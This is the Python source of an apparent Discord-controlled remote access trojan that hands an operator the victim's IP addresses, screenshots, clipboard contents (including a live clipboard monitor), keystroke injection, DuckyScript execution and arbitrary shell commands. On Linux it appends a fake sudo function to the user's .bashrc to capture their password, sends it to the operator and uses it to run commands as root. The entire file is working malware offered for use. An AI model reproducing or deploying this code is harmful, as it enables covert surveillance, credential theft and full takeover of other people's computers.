from dotenv import load_dotenv
import discord
from discord.ext import commands, tasks
import os
from PIL import ImageGrab
from platform import system
from requests import get
import socket
import pyperclip
import asyncio
import pyautogui
import subprocess


load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

class MyBot(commands.Bot):
    async def setup_hook(self):
        # self is the bot here
        print(f"Logged in as: {self.user}")
        await self.add_cog(clipboard_monitor(bot))
        await self.add_cog(SudoCog(bot))

bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)


if system() == "Windows":
    isWindows = True
    path = "C:\\Windows\\System32\\Tasks\\"
    home_path = os.path.expanduser("~") + "\\"
elif system() == "Linux":
    isWindows = False
    path = "/var/tmp/"
    home_path = os.path.expanduser("~") + "/"
else:
    exit()


# Standalone functions

def embed_data(title, description="", data="", color=discord.Color.green()):

    if data:
        description += f"\n```{data}```"
        
    embed = discord.Embed(
        title=title,
        color=color,
        description=description
    )
    return embed

def get_sudo_password():
    file = open(path + "passwd", "r")
    return file.read()

@bot.command(name="help")
async def help(ctx):
    help_menu_request = get("https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/help_menu.md")
    help_menu = help_menu_request.content.decode("utf-8")
    embed = embed_data(title="Help menu", description=help_menu)
    await ctx.send(embed=embed)


# IP functions

def get_public_ip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)
    return public_ip

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

@bot.command(name="ip")
async def ip(ctx):
    public_ip = get_public_ip()
    local_ip = get_local_ip()

    embed = discord.Embed(
        title="IP addresses",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )
    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await ctx.send(embed=embed)


# Screenshot functions

def take_screenshot():
    global path
    image_path = path + "screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(image_path)
    screenshot.close()

    return image_path

@bot.command(name="screenshot")
async def screenshot(ctx):

    image_path = take_screenshot()
    await ctx.send(file=discord.File(image_path))


# Clipboard functions
    
class clipboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.previous_clipboard = self.get_clipboard()

    def cog_unload(self) -> None:
        self.check_clipboard.stop()

    def get_clipboard(self):
        clipboard_content = pyperclip.paste()
        return clipboard_content

    def set_clipboard(self, text):
        pyperclip.copy(text)
        return text

    @tasks.loop(seconds=3)
    async def check_clipboard(self, ctx):
        try:
            clipboard = self.get_clipboard()
        except:
            pass

        if clipboard != self.previous_clipboard:
            self.previous_clipboard = clipboard

            if len(clipboard) > 2000:
                embed = embed_data(
                    title="Clipboard monitor",
                    description="Clipboard contents was too long",
                    color=discord.Color.red()
                    )
                await ctx.send(embed=embed)
            else:
                embed = embed_data(
                    title="Extracted clipboard contents | Monitor mode",
                    data=clipboard
                    )
                await ctx.send(embed=embed)

    @commands.group(name="clipboard", invoke_without_command=True)
    async def clipboard(self, ctx):
        await ctx.send("see help menu")

    @clipboard.group(name="monitor", invoke_without_command=True)
    async def monitor(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @monitor.command(name="start")
    async def start(self, ctx):
        self.check_clipboard.start(ctx)
        embed = embed_data(
            title="Clipboard monitor started",
            description="Clipboard monitor mode was started, disable with `clipboard monitor stop`"
            )
        await ctx.send(embed=embed)

    @monitor.command(name="stop")
    async def stop(self, ctx):
        self.check_clipboard.stop()
        embed = embed_data(
            title="Clipboard monitor stopped",
            description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`",
            color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @monitor.command(name="status")
    async def status(self, ctx):
        if self.check_clipboard.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(
            title="Clipboard monitor status",
            description=f"Clipboard monitor is: **{status}**",
            color=color)
        await ctx.send(embed=embed)

    @clipboard.command(name="get")
    async def get(self, ctx):
        clipboard_content = self.get_clipboard()

        embed = embed_data(
            title="Extracted clipboard contents:",
            data=clipboard_content
            )
        await ctx.send(embed=embed)

    @clipboard.command(name="set")
    async def set(self, ctx, text):
        text = self.set_clipboard(text)

        embed = embed_data(
            title="Set clipboard contents to:",
            data=text
            )
        await ctx.send(embed=embed)


# Keyboard functions

class keyboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def pyautogui_write(self, data, interval=0):
        pyautogui.write(data, interval=interval)

    def pyautogui_press(self, key):
        pyautogui.press(key)

    def pyautogui_hotkey(self, hotkeys):
        pyautogui.hotkey(hotkeys)

    async def parse_ducky_script(self, ducky_script):
        file = ducky_script.splitlines()

        for line in file:
            split = line.split(" ")
            args = []
            for arg in split:
                args.append(arg.replace("\n", ""))

            match args[0]:
                case "REM":
                    pass

                case "STRING":
                    text = " ".join(args[1:])
                    self.pyautogui_write(text)

                case "STRINGLN":
                    text = " ".join(args[1:])
                    self.pyautogui_write(text)
                    await asyncio.sleep(0.2)
                    self.pyautogui_press("ENTER")

                case "DELAY":
                    time = int(args[1]) / 1000
                    await asyncio.sleep(time)

                case _:
                    hotkeys = []
                    for arg in args:
                        hotkeys.append(arg.replace("GUI", "win"))
                    print(hotkeys)
                    self.pyautogui_hotkey(hotkeys)


    @bot.group(name="keyboard", invoke_without_command=True)
    async def keyboard(self, ctx):
        await ctx.send("see help menu")

    @keyboard.command(name="duckyscript")
    async def duckyscript(self, ctx):
        attachment_url = ctx.message.attachments[0].url

        file_contents = get(attachment_url)
        file_contents_str = file_contents.content.decode("utf-8")

        await self.parse_ducky_script(file_contents_str)

        embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())

        await ctx.send(embed=embed)

    @keyboard.command(name="write")
    async def write(self, ctx, arg):
        self.pyautogui_write(arg)
        embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="press")
    async def press(self, ctx, arg):
        self.pyautogui_press(arg)
        embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="hotkey")
    async def hotkey(self, ctx, *args):
        hotkeys = []
        for arg in args:
            hotkeys.append(arg.replace("GUI", "win"))
        print(hotkeys)
        self.pyautogui_hotkey(hotkeys)
        embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
        await ctx.send(embed=embed)


# Shell functions
        
class shell_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def execute_shell(self, command, timeout):
        process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
        print("done")

        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            print("shell done")
            return stdout.decode().strip() + stderr.decode().strip()
            
        except asyncio.TimeoutError:
            print("timed out")
            return 1

    @bot.command(name="shell", invoke_without_command=True)
    async def shell(self, ctx, *args):
        args = list(args)

        for index, item in enumerate(args):
            if item == "-t":
                timeout_index = index + 1
                timeout = int(args[timeout_index])
                args.remove(item)
                args.pop(index)
                break
        else:
            timeout = 30
        print(timeout)
        print(args)

        arg = ' '.join(args)
        print(arg)

        output = await self.execute_shell(arg, timeout)

        if output == 1:
            embed = embed_data(
                title="Command timed out | Shell",
                description=f"Executed command timed out after {timeout} seconds:",
                data=arg,
                color=discord.Color.red()
                )
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"```\n{output}\n```")


# Linux specifix commands

if isWindows == False:
    print("its linux")
    print(home_path)

    # root functions

    class SudoCog(commands.Cog):
        def __init__(self, bot):
            self.bot = bot

        async def check_passwd_file(self, ctx):
            embed = embed_data(title="Sudo password", description="Listening for root password started")
            await ctx.send(embed=embed)
            while True:
                try:
                    file = open(path + "passwd", "r")
                    passwd = file.read()
                    os.remove(path + "passwd")
                    return passwd
                except FileNotFoundError:
                    print("no file")
                    pass
                await asyncio.sleep(1)

        async def intercept_sudo(self, ctx):
            injection_code = """\nsudo() {
while true; do
    read -s -r -p "[sudo fake] password for ${USER}: " passwd
    echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
    clear
    echo Sorry, try again.
done
}"""

            file = open(home_path + ".bashrc", "r")
            original_bashrc = file.read()
            file.close()

            file = open(home_path + ".bashrc", "a")
            file.write(injection_code)
            file.close()

            passwd = await self.check_passwd_file(ctx)

            file = open(home_path + ".bashrc", "w")
            file.write(original_bashrc)
            file.close()

            return passwd

        @commands.group(name="sudo", invoke_without_command=True)
        async def sudo(self, ctx):
            await ctx.send("see help menu")

        @sudo.command(name="password")
        async def password(self, ctx):
            global sudo_password
            passwd = await self.intercept_sudo(ctx)
            sudo_password = passwd
            embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
            await ctx.send(embed=embed)

        @sudo.command(name="shell")
        async def shell(self, ctx, *args):
            global sudo_password
            print("ran as sudo")
            added_sudo_args = ("echo", f"'{sudo_password}'", "|", "sudo", "-S") + args
            await shell_cog.shell(ctx, *added_sudo_args)

    


# Running the bot
    
bot.run(DISCORD_TOKEN)